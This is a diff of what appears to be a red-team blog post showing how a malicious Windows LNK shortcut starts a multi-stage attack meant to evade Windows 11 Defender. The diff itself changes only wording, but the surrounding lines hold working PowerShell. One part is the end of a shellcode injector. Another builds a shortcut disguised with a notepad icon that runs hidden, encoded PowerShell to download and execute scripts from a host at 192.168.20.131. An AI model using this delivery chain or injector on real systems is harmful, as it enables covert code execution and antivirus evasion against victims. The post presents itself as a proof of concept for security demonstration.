@@ -10,7 +10,7 @@
 
 ## Outline  {#section-0}
 
-The objective of this document is to demonstrate the utilization of a malicious LNK file to initiate a multi-stage attack, including downloading and executing obfuscated AMSI bypass script, a shell code injector to bypass the most up-to-date Windows 11 Defender. 
+The objective of this document is to demonstrate the utilization of a malicious LNK file to initiate a multi-stage attack, including downloading and executing obfuscated AMSI bypass script and a shell code injector to bypass the most up-to-date Windows 11 Defender. 
 
 ![](/assets/AV/LNKSummary.png)  
 
@@ -21,7 +21,7 @@ Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. 
 
 An LNK file, short for Shell Link Binary File, is a file type associated with Windows shortcuts. LNK files typically serve as pointers to executable files or applications, allowing users to quickly access programs or documents. However, in a malicious context, an LNK file can be crafted to download and execute a Defender bypass script along with a shell code injector. This technique is employed in cyberattacks to evade detection by security tools and gain unauthorized access or control over a target system. Similar to Word document macros, the malicious LNK file exploits the execution capabilities of its associated application to carry out unauthorized actions on the compromised system.
 
-# LNK Exploitation Proof of Concept {#section-3}
+# LNK Exploitation Proof of Concept (PoC) {#section-3}
 <img src="/assets/AV/LNK.gif" width="1500" height="2500"/>
 
 Below are the steps:
@@ -62,9 +62,11 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 
 ```
-Conduct obfuscation on both AMSI SCript and and Shell Code Injector. This process has been neglected for possible abuse cases.
+Conduct obfuscation on both AMSI SCript and and Shell Code Injector. 
 
-Now we continue to craft our LNK file
+This process has been neglected for possible abuse cases.
+
+Finally craft our LNK file
 
 ```bash
 $doordash = 'iex (iwr -UseBasicParsing http://192.168.20.131:8888/google.txt);(iwr -usebasicparsing http://192.168.20.131:8888/facebookTest.ps1)|IEX'
@@ -79,6 +81,7 @@ $link.iconlocation = "C:\windows\system32\notepad.exe"
 $link.arguments = "/c powershell -Nop -ep bypass -w hidden -EncodedCommand  $($encodedCommand)"
 $link.save()
 ```
+
 
 
 
